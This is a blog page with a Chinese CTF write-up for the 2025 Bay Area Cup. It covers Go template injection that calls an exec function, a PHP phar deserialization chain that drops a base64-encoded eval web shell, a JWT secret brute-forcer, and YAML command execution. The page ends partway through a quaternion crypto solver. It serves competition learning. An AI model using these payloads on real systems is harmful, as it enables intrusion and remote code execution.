<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>湾区杯2025 | ArcNova</title><meta name="author" content="ArcNova"><meta name="copyright" content="ArcNova"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="湾区杯2025WebSSTIGo 模板语法测试 1&#123;&#123;$&#125;&#125;  返回： 1map[B64Decode:0x6ee380 exec:0x6ee120]  该对象包含两个函数：B64Decode 和 exec  如果 exec 是可直接访问的属性，应该返回函数地址 123&#123;&#123;.exec&#125;&#125; - 直接访问&#123;&amp;#12">
<meta property="og:type" content="article">
<meta property="og:title" content="湾区杯2025">
<meta property="og:url" content="https://arcnova7.github.io/2025/12/08/%E6%B9%BE%E5%8C%BA%E6%9D%AF/index.html">
<meta property="og:site_name" content="ArcNova">
<meta property="og:description" content="湾区杯2025WebSSTIGo 模板语法测试 1&#123;&#123;$&#125;&#125;  返回： 1map[B64Decode:0x6ee380 exec:0x6ee120]  该对象包含两个函数：B64Decode 和 exec  如果 exec 是可直接访问的属性，应该返回函数地址 123&#123;&#123;.exec&#125;&#125; - 直接访问&#123;&amp;#12">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://imgslim.geekpark.net/uploads/image/file/2b/d3/2bd37f20466d5d1cbf0928c27697b205.jpeg">
<meta property="article:published_time" content="2025-12-08T15:49:36.000Z">
<meta property="article:modified_time" content="2025-12-14T02:56:17.825Z">
<meta property="article:author" content="ArcNova">
<meta property="article:tag" content="CTF">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://imgslim.geekpark.net/uploads/image/file/2b/d3/2bd37f20466d5d1cbf0928c27697b205.jpeg"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "湾区杯2025",
  "url": "https://arcnova7.github.io/2025/12/08/%E6%B9%BE%E5%8C%BA%E6%9D%AF/",
  "image": "https://imgslim.geekpark.net/uploads/image/file/2b/d3/2bd37f20466d5d1cbf0928c27697b205.jpeg",
  "datePublished": "2025-12-08T15:49:36.000Z",
  "dateModified": "2025-12-14T02:56:17.825Z",
  "author": [
    {
      "@type": "Person",
      "name": "ArcNova",
      "url": "https://ArcNova7.github.io"
    }
  ]
}</script><link rel="shortcut icon" href="/img/icons8.jpg"><link rel="canonical" href="https://arcnova7.github.io/2025/12/08/%E6%B9%BE%E5%8C%BA%E6%9D%AF/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":true},
  copy: {
    success: 'Copy Successful',
    error: 'Copy Failed',
    noSupport: 'Browser Not Supported'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: 'Just now',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: 'Load More'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '湾区杯2025',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/icon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">24</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">15</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">5</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/gallery/"><i class="fa-fw fas fa-video"></i><span> gallery</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(https://imgslim.geekpark.net/uploads/image/file/2b/d3/2bd37f20466d5d1cbf0928c27697b205.jpeg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">ArcNova</span></a><a class="nav-page-title" href="/"><span class="site-name">湾区杯2025</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  Back to Home</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/gallery/"><i class="fa-fw fas fa-video"></i><span> gallery</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">湾区杯2025</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2025-12-08T15:49:36.000Z" title="Created 2025-12-08 23:49:36">2025-12-08</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2025-12-14T02:56:17.825Z" title="Updated 2025-12-14 10:56:17">2025-12-14</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/">CTF</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="湾区杯2025"><a href="#湾区杯2025" class="headerlink" title="湾区杯2025"></a>湾区杯2025</h1><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h3 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h3><p>Go 模板语法测试</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;$&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>返回：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">map[B64Decode:0x6ee380 exec:0x6ee120]</span><br></pre></td></tr></table></figure>

<p>该对象包含两个函数：<code>B64Decode</code> 和 <code>exec</code></p>
<p><img src="/2025/12/08/%E6%B9%BE%E5%8C%BA%E6%9D%AF/VkqNbXJVvoDeclxgeCKjY9S3pPh.png"></p>
<p>如果 <code>exec</code> 是可直接访问的属性，应该返回函数地址</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;.exec&#125;&#125; - 直接访问</span><br><span class="line"></span><br><span class="line">&#123;&#123;call .exec &quot;whoami&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2025/12/08/%E6%B9%BE%E5%8C%BA%E6%9D%AF/ZFQFbJG28oOrSNxL1hmjnsf6pyf.png"></p>
<p><img src="/2025/12/08/%E6%B9%BE%E5%8C%BA%E6%9D%AF/N9gxbqONCotMUyxCkpUjeWbbpyh.png"></p>
<p>存在过滤</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;call .exec &quot;dir /bin&quot;&#125;&#125;查看可执行程序</span><br></pre></td></tr></table></figure>
<p><img src="/2025/12/08/%E6%B9%BE%E5%8C%BA%E6%9D%AF/J6bdbkppvonFsXxbHR1jtfzUptb.png"></p>
<p>base64 失败,尝试继续编码执行</p>
<p><img src="/2025/12/08/%E6%B9%BE%E5%8C%BA%E6%9D%AF/Ajakb3P35ojdXyxxIUOj7ng9pih.png"></p>
<h3 id="eazy-readfile"><a href="#eazy-readfile" class="headerlink" title="eazy_readfile"></a>eazy_readfile</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class Acheron &#123;</span><br><span class="line">    public <span class="variable">$mode</span>;</span><br><span class="line">    public <span class="keyword">function</span> __construct(<span class="variable">$mode</span>)&#123;</span><br><span class="line">        <span class="variable">$this</span>-&gt;mode = <span class="variable">$mode</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> serialize(new Acheron(<span class="string">&#x27;r&#x27;</span>));</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1=O:7:&quot;Acheron&quot;:1:&#123;s:4:&quot;mode&quot;;s:1:&quot;r&quot;;&#125;&amp;0=/etc/passwd</span><br></pre></td></tr></table></figure>

<p>序列化读取文件</p>
<p>生成 phar 文件</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span> = new Phar(<span class="string">&quot;poc.phar.abc&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line"><span class="variable">$payload</span> = <span class="string">&#x27;system(&quot;echo \&#x27;</span>PD9waHAgZXZhbCgkX1BPU1RbIjMzMyJdKTs=\&#x27; |<span class="built_in">base64</span> -d &gt; poc.php<span class="string">&quot;);&#x27;;</span></span><br><span class="line"><span class="string"><span class="variable">$phar</span>-&gt;setStub(&quot;</span>&lt;?php <span class="variable">$payload</span> __HALT_COMPILER(); ?&gt;<span class="string">&quot;);</span></span><br><span class="line"><span class="string"><span class="variable">$phar</span>-&gt;addFromString(&#x27;test.txt&#x27;, &#x27;test&#x27;);</span></span><br><span class="line"><span class="string"><span class="variable">$phar</span>-&gt;stopBuffering();</span></span><br></pre></td></tr></table></figure>

<p>new Acheron(‘w’)上传生成的 phar 文件</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 这是一个示例 Python 脚本。</span></span><br><span class="line"><span class="comment"># from urllib import request</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">url=<span class="string">&#x27;http://web-14b773f06b.challenge.xctf.org.cn:80/&#x27;</span></span><br><span class="line">proxy = &#123;</span><br><span class="line">    <span class="string">&#x27;http&#x27;</span>: <span class="string">&#x27;http://127.0.0.1:8080&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;https&#x27;</span>: <span class="string">&#x27;http://127.0.0.1:8080&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_file</span>():</span><br><span class="line">    file_content = <span class="built_in">open</span>(<span class="string">&quot;D:\phpstudy_pro\WWW\poc.phar.abc.gz&quot;</span>,<span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;0&quot;</span>: file_content,</span><br><span class="line">        <span class="string">&quot;1&quot;</span>: <span class="string">&#x27;O:7:&quot;Acheron&quot;:1:&#123;s:4:&quot;mode&quot;;s:1:&quot;w&quot;;&#125;&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    file_name = requests.post(url  , data=data, proxies = proxy).text</span><br><span class="line">    <span class="built_in">print</span>(file_name)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 按装订区域中的绿色按钮以运行脚本。</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    upload_file()</span><br></pre></td></tr></table></figure>

<p>蚁剑登录</p>
<p><img src="/2025/12/08/%E6%B9%BE%E5%8C%BA%E6%9D%AF/WBvvbkGrmoiHVFx49injPTcdpuc.png"></p>
<p>&#x2F;flag 没法直接读</p>
<p><img src="/2025/12/08/%E6%B9%BE%E5%8C%BA%E6%9D%AF/YtSObQOasoHohyxab1jjqRaopgc.png"></p>
<p>发现 run.sh 可以降低权限，直接创建软链接&#x2F;flag 到&#x2F;var&#x2F;www&#x2F;html 下，等待脚本执行，最后复制到 backup 目录下，最后直接访问 url&#x2F;backup&#x2F;flaglink 读取</p>
<p><img src="/2025/12/08/%E6%B9%BE%E5%8C%BA%E6%9D%AF/N8a9b9EzLo7eecxp5Hgj62x2pPh.png"></p>
<h3 id="eazy-python"><a href="#eazy-python" class="headerlink" title="eazy_python"></a>eazy_python</h3><p>类似题型参考 <a target="_blank" rel="noopener" href="https://blog.lie.moe/2024/11/17/weekly2/">https://blog.lie.moe/2024/11/17/weekly2/</a></p>
<p>知识点参考：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/11927">https://xz.aliyun.com/news/11927</a></p>
<p>上传 yaml 文本，命令执行</p>
<p>执行 YAML 中定义的方法</p>
<p>但是上传过程发现必须是 admin，报错时会报错 secret 为 @o70xO$0%#qR9#**</p>
<p><img src="/2025/12/08/%E6%B9%BE%E5%8C%BA%E6%9D%AF/U4Z9bsMjjoFWYUx1JMzjlAWbpEh.png"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"><span class="keyword">from</span> jwt.exceptions <span class="keyword">import</span> ExpiredSignatureError, InvalidTokenError</span><br><span class="line"></span><br><span class="line">PREFIX = <span class="string">&quot;@o70xO$0%#qR9#&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">enumerate_suffixes</span>(<span class="params">_alphabet_: <span class="built_in">str</span></span>):</span><br><span class="line">    size = <span class="built_in">len</span>(alphabet)</span><br><span class="line">    total = size * size</span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(total):</span><br><span class="line">        q, r = <span class="built_in">divmod</span>(n, size)</span><br><span class="line">        <span class="keyword">yield</span> alphabet[q] + alphabet[r]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_valid</span>(<span class="params">_token_: <span class="built_in">str</span>, _secret_: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        jwt.decode(</span><br><span class="line">            token,</span><br><span class="line">            _key_=secret,</span><br><span class="line">            _algorithms_=(<span class="string">&quot;HS256&quot;</span>,),</span><br><span class="line">            _options_=&#123;<span class="string">&quot;verify_exp&quot;</span>: <span class="literal">False</span>, <span class="string">&quot;verify_aud&quot;</span>: <span class="literal">False</span>&#125;,</span><br><span class="line">        )</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span> ExpiredSignatureError:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span> InvalidTokenError:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>() -&gt; <span class="literal">None</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;JWT&gt; &quot;</span>, _end_=<span class="string">&quot;&quot;</span>, _flush_=<span class="literal">True</span>)</span><br><span class="line">    token = sys.stdin.readline().strip()</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> token:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;empty token&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    alphabet = <span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span></span><br><span class="line">    <span class="keyword">for</span> sfx <span class="keyword">in</span> enumerate_suffixes(alphabet):</span><br><span class="line">        secret = PREFIX + sfx</span><br><span class="line">        <span class="keyword">if</span> is_valid(token, secret):</span><br><span class="line">            <span class="built_in">print</span>(secret)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;not found&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>重新生成一个</p>
<p><img src="/2025/12/08/%E6%B9%BE%E5%8C%BA%E6%9D%AF/Lrw1bJNV4oHmHwxesljjPGdHpoh.png"></p>
<p>AI 给出了危险的 yaml 执行示例</p>
<p>存在过滤</p>
<p><img src="/2025/12/08/%E6%B9%BE%E5%8C%BA%E6%9D%AF/QjdmbYmGtoew0uxV7aUjPekjpHe.png"></p>
<ol>
<li>subprocess 模块中的常用函数</li>
</ol>
<p>尝试执行得到 flag</p>
<p><img src="/2025/12/08/%E6%B9%BE%E5%8C%BA%E6%9D%AF/KNpybge7HosFPLx7mDRjA9jRp1e.png"></p>
<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h3 id="new-trick"><a href="#new-trick" class="headerlink" title="new_trick"></a>new_trick</h3><p>四元数 <em>Q</em> <code>=(</code> <em>a</em> <code>,</code> <em>b</em> <code>,</code> <em>c</em> <code>,</code> <em>d</em> <code>)</code> 的范数定义为 $N(Q)&#x3D;a^2+b^2+c^2+d^2\ mod\ p$ 。<br>由于范数具有乘法同态性 $N(Q^k)&#x3D;N(Q)^k\ mod\ p$ ，可将原问题转化为：</p>
<p>$$<br>N(R)&#x3D;N(Q)^{secret}\ mod\ p<br>$$</p>
<p>其中 $R&#x3D;Q^{secret}$ 是已知的。</p>
<p>针对这里的离散对数问题，可以采取大步小步算法来求解。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> unpad</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> isqrt, ceil</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">p = <span class="number">115792089237316195423570985008687907853269984665640564039457584007913129639747</span></span><br><span class="line">Q_components = (<span class="number">123456789</span>, <span class="number">987654321</span>, <span class="number">135792468</span>, <span class="number">864297531</span>)</span><br><span class="line"></span><br><span class="line">ciphertext = <span class="string">b&#x27;(\xe4IJ\xfd4%\xcf\xad\xb4\x7fi\xae\xdbZux6-\xf4\xd72\x14BB\x1e\xdc\xb7\xb7\xd1\xad#e@\x17\x1f\x12\xc4\xe5\xa6\x10\x91\x08\xd6\x87\x82H\x9e&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Quaternion</span>:</span><br><span class="line">    __slots__ = (<span class="string">&#x27;p&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, a, b, c, d, pmod=p</span>):</span><br><span class="line">        <span class="variable language_">self</span>.p = pmod</span><br><span class="line">        <span class="variable language_">self</span>.a = a % <span class="variable language_">self</span>.p</span><br><span class="line">        <span class="variable language_">self</span>.b = b % <span class="variable language_">self</span>.p</span><br><span class="line">        <span class="variable language_">self</span>.c = c % <span class="variable language_">self</span>.p</span><br><span class="line">        <span class="variable language_">self</span>.d = d % <span class="variable language_">self</span>.p</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__repr__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;Q(<span class="subst">&#123;self.a&#125;</span>, <span class="subst">&#123;self.b&#125;</span>, <span class="subst">&#123;self.c&#125;</span>, <span class="subst">&#123;self.d&#125;</span>)&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__eq__</span>(<span class="params">self, other</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="variable language_">self</span>.a == other.a <span class="keyword">and</span> <span class="variable language_">self</span>.b == other.b <span class="keyword">and</span></span><br><span class="line">                <span class="variable language_">self</span>.c == other.c <span class="keyword">and</span> <span class="variable language_">self</span>.d == other.d)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__hash__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># 用元组哈希</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">hash</span>((<span class="variable language_">self</span>.a, <span class="variable language_">self</span>.b, <span class="variable language_">self</span>.c, <span class="variable language_">self</span>.d))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__mul__</span>(<span class="params">self, 